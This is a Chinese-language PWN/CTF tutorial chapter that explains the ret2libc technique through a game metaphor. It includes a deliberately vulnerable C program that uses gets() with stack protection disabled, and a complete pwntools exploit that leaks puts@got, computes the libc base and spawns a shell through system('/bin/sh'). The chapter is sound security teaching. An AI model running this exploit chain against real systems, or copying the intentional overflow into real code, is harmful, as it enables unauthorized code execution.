# 第 10 关 · ret2libc：借用游戏自带的技能库

## 🎬 游戏开场

你遇到一个"全副武装"的关卡：

- 栈上装了警报器（Canary）——先放过，假设这关没有。
- 数据区禁止执行代码（NX）——自带作弊器（ret2shellcode）直接作废。
- 程序里干干净净，没有后门、没有 `system("/bin/sh")`——ret2text 也泡汤。

看起来无路可走？

但你注意到一件事：**游戏自己要打印文字，所以它会调用 `puts`；要读输入，会调用 `gets`。这些函数都不在游戏本体里，而是从系统的"公共技能库"（libc）借来的。**

既然能借 `puts`，为什么不能借 `system`？

这就是 **ret2libc**：**不自己写代码，也不靠程序后门，而是调用系统库里现成的 `system("/bin/sh")`。**

本关是整本教程的分水岭。搞懂它，你就真正入门了。

---

## 🧠 核心概念（游戏版）

### 1. libc 是什么？

**libc** 是 Linux 系统里最基础的"公共技能库"，里面装着成千上万个函数：`printf`、`puts`、`gets`、`system`、`malloc`、`free`……程序运行时动态加载它（回顾第 5 关的 PLT/GOT）。

关键事实：

- **`system` 在 libc 里**，它的地址 = libc 基址 + 固定偏移。
- **`/bin/sh` 字符串也在 libc 里**，同样 = libc 基址 + 固定偏移。
- 每个 libc 版本里，这些"固定偏移"是固定的（可以从 libc 文件里查到）。

所以我们的目标变成：

> **找到 libc 的基址 → 算出 system 和 /bin/sh 的地址 → 让程序执行 system("/bin/sh")。**

### 2. 难点：ASLR 把libc洗牌了

系统每次启动程序，libc 被加载到**随机地址**（ASLR）。你背的"system 在 0x7f1234567890"下次就变了。

怎么办？用游戏里的经典套路——**泄露 + 计算**：

> 程序的 GOT 表里记录着 `puts` 的真实地址（第 5 关）。\
> 只要想办法把 GOT 表里 `puts` 的内容打印出来，就能得到 `puts` 的真实地址。\
> 而 `puts` 的真实地址 = libc 基址 + puts 的固定偏移。\
> 所以：**libc 基址 = 泄露的puts地址 − puts偏移**。\
> 有了基址，system 和 /bin/sh 的地址就都能算出来了！

这就像：你不知道整个城市挪到哪了，但你认得城门口那座钟楼（puts）。看到钟楼的真实坐标，对照地图上的相对位置，就能推出全城——包括你要去的 system 大厅在哪。

### 3. 两步走攻击

ret2libc 一般分**两轮**发送 payload（因为要先泄露再攻击）：

#### 第一轮：泄露 libc 地址

利用栈溢出，让程序调用 `puts(GOT里的puts地址)`，打印出 puts 的真实地址：

```python
# 构造ROP：puts(puts@got) ; 然后回到 main 再来一次
payload  = b'A' * offset
payload += p64(pop_rdi)          # 把 rdi 设为 puts@got（put的参数）
payload += p64(puts_got)
payload += p64(puts_plt)         # 调用 puts 打印它
payload += p64(main_addr)        # 返回 main，进行第二轮
```

等等——`pop rdi` 是什么？这就是 **ROP gadget**，第 11 关会详讲。现在你只需知道：因为 `puts` 的参数要放在 `rdi` 里（第 3 关的传参协议），所以要先找一小段 `pop rdi; ret` 指令，把参数塞进 rdi。

程序打印出 puts 地址后，脚本接收：

```python
leak = p.recvline().strip()
puts_addr = u64(leak.ljust(8, b'\x00'))
libc_base = puts_addr - puts_offset
```

#### 第二轮：正式攻击

拿到基址后，构造第二次溢出：

```python
system_addr = libc_base + system_offset
binsh_addr  = libc_base + binsh_offset

payload  = b'A' * offset
payload += p64(pop_rdi)
payload += p64(binsh_addr)       # rdi = "/bin/sh"
payload += p64(ret)              # 有时需要对齐栈（见下文）
payload += p64(system_addr)      # 调用 system
p.sendline(payload)
p.interactive()                  # shell 到手！
```

### 4. 栈对齐的小坑

有时第二轮的 `system` 调用会崩溃，报 `movaps ... Segmentation fault`。这是因为 x86-64 的 System V ABI 要求调用时栈 16 字节对齐。解决办法：在 `pop rdi` 和 `system` 之间插一个单独的 `ret` 指令（占 8 字节，把栈对齐）。

```python
payload += p64(ret_gadget)   # 栈对齐，可加可不加，加了更稳
```

这就是你会在 exp 里看到 `p64(ret)` 的原因——不是玄学，是栈对齐。

---

## 🔧 真实世界对照

| 游戏说法 | 真实术语 |
| --- | --- |
| 公共技能库 | libc（动态链接库） |
| 技能在库里的位置 | 函数偏移（offset） |
| 找到城里的钟楼 | 泄露已加载函数地址 |
| 推出全城位置 | 计算 libc 基址 |
| 借 system 技能 | ret2libc |

**怎么查偏移？**

```bash
# 查 libc 版本
ldd ./vuln

# 查函数在libc里的偏移（假设 libc.so.6）
nm -D libc.so.6 | grep " puts@@"
nm -D libc.so.6 | grep " system@@"

# 查 /bin/sh 字符串的偏移
strings -a -t x libc.so.6 | grep "/bin/sh"

# 或用 pwntools 一步到位
python3 -c "from pwn import *; l=ELF('./libc.so.6'); print(hex(l.symbols['system']), hex(next(l.search(b'/bin/sh'))))"
```

**注意**：libc 版本必须和题目环境一致！本地 libc 和远程服务器的 libc 常常不同，偏移也不同。实战要先判断远程 libc 版本（泄露 puts 地址的低 12 位比对，或用 LibcSearcher 工具）。

---

## 🎯 闯关任务：你的第一个 ret2libc

用第 7 关的 `vuln` 程序（无 Canary、无 PIE），但去掉 backdoor：

```c
#include <stdio.h>
void vuln() {
    char buf[16];
    puts("input:");
    gets(buf);
}
int main(){ vuln(); return 0; }
```

```bash
gcc -g -O0 -fno-stack-protector -no-pie vuln.c -o vuln
```

exp 框架（libc 用系统自带的 `/lib/x86_64-linux-gnu/libc.so.6`）：

```python
from pwn import *
context.binary = elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./vuln')

# 找 gadget
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 第一轮：泄露 puts@got
payload  = b'A' * 24
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts']) + p64(elf.sym['main'])
p.sendline(payload)
p.recvline()
puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']
log.success('libc base: ' + hex(libc_base))

# 第二轮：system("/bin/sh")
p.recv()
system = libc_base + libc.sym['system']
binsh  = libc_base + next(libc.search(b'/bin/sh\x00'))
payload  = b'A' * 24
payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
p.sendline(payload)
p.interactive()
```

跑通它，你就掌握了 PWN 最核心的套路之一。

---

## 📌 本关小结

| 你学会了 | 一句话记忆 |
| --- | --- |
| ret2libc | 借系统库里的 system("/bin/sh") |
| 核心难题 | ASLR 让 libc 地址随机 |
| 破解 | 泄露 GOT 里的函数地址 → 算 libc 基址 |
| 两步走 | 第一轮泄露并回 main，第二轮 get shell |
| 栈对齐 | 插入 ret gadget 防 movaps 崩溃 |

**这是全教程最重要的一关**，务必亲手打通。打通后，你再看 ROP 就会觉得水到渠成。

---

## 🎬 下一关预告

**第 11 关 · ROP：乐高积木大法**

ret2libc 里我们用了 `pop rdi; ret` 这种"小片段"——它其实是 **ROP（返回导向编程）** 的冰山一角。

ROP 的思想：**在程序/libc 里找一堆以 `ret` 结尾的小指令片段（gadget），像拼乐高一样把它们串起来，实现任意操作。**

下一关我们系统学习怎么找 gadget、怎么拼 ROP 链，以及当"一个 gadget 不够用"时的组合技。这是你从"会打固定套路"到"能灵活构造任意攻击"的蜕变。
